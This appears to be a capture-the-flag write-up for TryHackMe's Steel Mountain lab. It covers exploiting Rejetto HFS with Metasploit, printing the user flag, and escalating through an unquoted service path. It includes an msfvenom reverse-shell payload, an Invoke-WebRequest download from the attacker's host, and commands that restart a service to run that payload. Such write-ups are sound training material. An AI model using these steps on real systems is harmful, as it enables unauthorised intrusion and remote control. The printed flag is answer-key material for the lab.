# Steel Mountain
#### Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.
#### [Room Link](1)

## Tasks
1. Introduction
  Start off by deploying the machine and run an nmap scan to start it off.
  `nmap -sV -sC -Pn -oN nmap_basic.txt ` with that we get a bit of output.

  While that runs we can open up the webpage, take a look at the page source and see our
  employee of the month's name is `Bill Harper`
  ![sourcebillhttp](2)
2. Initial Access
  Taking a look back at the nmap script we get these results
  ```
  ORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-03-21T18:53:21+00:00; +1s from scanner time.
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49161/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:fc:8c:3b:e0:f4 (unknown)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-03-21T18:53:16
|_  start_date: 2020-03-21T18:49:30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.35 seconds
  ```

  Looking at the results we have another web server on port 8080, which we can check out below.
  ![upload8080page](3)

  We can see it is running `Rejetto HTTP File Server`. after doing a quick google search we find an exploit [here](4)
  Using `searchsploit Rejetto HTTP File Server` we see there is a metasploit module to exploit it. We can start with that then try manually exploitation.
  Loading up msf with `msfconsole` searching for the exploit with  `search rejetto` then loading up the exploit with `use exploit/windows/http/rejetto_hfs_exec` after that we set the correct RHOST and RPORT then `exploit`.

  We get the exploit to run and see with `getuid` that we are on the user `bill`. Navigate to his Desktop directory and we can find the flag! `b04763b6fcf51fcd7c13abc7db4fd365`

3. Privilege Escalation
  For privilege escalation we are using the common [PowerSploit Repo](5) and PowerUp.ps1 to see what
  options we have to escalate. First copy over the PowerUp.ps1 script to your current directory. Upload it via your meterpreter shell with `upload PowerUp.ps1`. After it uploads drop into a meterpreter powershell shell with  `load powershell` then run `powershell_shell` to drop into a PS Metasploit shell. Then load in the PowerUp.ps1 then Invoke-AllChecks like so
  ```
  meterpreter > upload PowerUp.ps1
[*] uploading  : PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 549.65 KiB of 549.65 KiB (100.0%): PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : PowerUp.ps1 -> PowerUp.ps1
meterpreter > powershell_shell

PS > . .\PowerUp.ps1
PS > Invoke-AllChecks

[*] Running Invoke-AllChecks

[*] Checking if user is in a local group with administrative privileges...

[*] Checking for unquoted service paths...
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False

[*] Checking service executable and argument permissions...
ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True

ServiceName                     : IObitUnSvr
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
CanRestart                      : False

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
CanRestart                      : False
[*] Checking service permissions...
[*] Checking %PATH% for potentially hijackable DLL locations...
[*] Checking for AlwaysInstallElevated registry key...
[*] Checking for Autologon credentials in registry...
[*] Checking for modifidable registry autoruns and configs...
[*] Checking for modifiable schtask files/configs...
[*] Checking for unattended install files...
[*] Checking for encrypted web.config strings...
[*] Checking for encrypted application pool and virtual directory passwords...
[*] Checking for plaintext passwords in McAfee SiteList.xml files....
[*] Checking for cached Group Policy Preferences .xml files....
  ```

  Seeing these result we can look at the services for unquoted service paths.
  unquoted service paths are where we can replace the service path if it was not put in quotes.
  To do this we would also have to restart the service which we can also see on services with
  `CanRestart     : True` on them. We see the Service `AdvancedSystemCareService9` can be restarted and can modify the service path.
  In that case lets generate reverse_tcp shell with `msfvenom`
  `msfvenom -p windows/shell/reverse_tcp LHOST=10.8.30.155 LPORT=4556 -e x86/shikata_ga_nai  -f exe > Advanced.exe`

  Then setup an metasploit handler with `use exploit/multi/handler` set your LHOST and LPORT then run the handler in the background with `exploit -j`.

  Back on the original metasploit shell upload the Advanced.exe file to `C:\Program Files (x86)\IObit` so that it can be the first ran. you can do that with powershell using
  `powershell Invoke-WebRequest -Uri http://10.8.30.155:8000/Advanced.exe -Outfile Advanced.exe`

  After that we restart the service with `sc stop AdvancedSystemCareService9` then `sc start AdvancedSystemCareService9`
5. Sample

## Review

For links
[1]:https://tryhackme.com/room/steelmountain
[2]:.\resources\steel_source80.png
[3]:.\resources\steel_upload8080.png
[4]:https://www.exploit-db.com/exploits/34668
[5]:https://github.com/PowerShellMafia/PowerSploit
